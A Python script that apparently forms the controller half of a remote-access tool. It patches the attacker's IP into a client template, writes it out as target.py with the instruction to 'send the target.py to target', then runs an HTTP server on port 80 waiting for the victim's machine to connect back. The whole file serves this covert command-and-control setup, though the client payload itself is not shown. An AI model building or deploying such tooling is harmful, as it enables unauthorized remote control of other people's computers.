#!/usr/bin/env/python3
from server import HTTPHandler
from http.server import HTTPServer
import socket as s
import argparse

def arguments():
    parser = argparse.ArgumentParser(description='Get input for IP and port')
    parser.add_argument('-i', '--ip', metavar='192.168.1.1', help='The IP which the Web Server runs', default=s.gethostbyname(s.gethostname()))
    args = parser.parse_args()
    return args.ip

def setTargetFile(ip):
    with open('client.py', 'r') as file :
        filedata = file.read()
    find='IP=""'
    replace=f'IP="{ip}"'
    filedata = filedata.replace(find, replace)
    with open('target.py', 'w') as file:
        file.write(filedata)
    print("taget.py is created, Now send the target.py to target")
        

def main():
    IP=arguments()
    setTargetFile(IP)
    while True:
        try:
            httpd = HTTPServer((IP, 80), HTTPHandler)
            print(f"Server started on {IP}:80\nWaiting for target to connect")
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("You Have Closed the service")
            break
        except Exception as e:
            print (str(e))
            break
        

if __name__ == '__main__':
    main()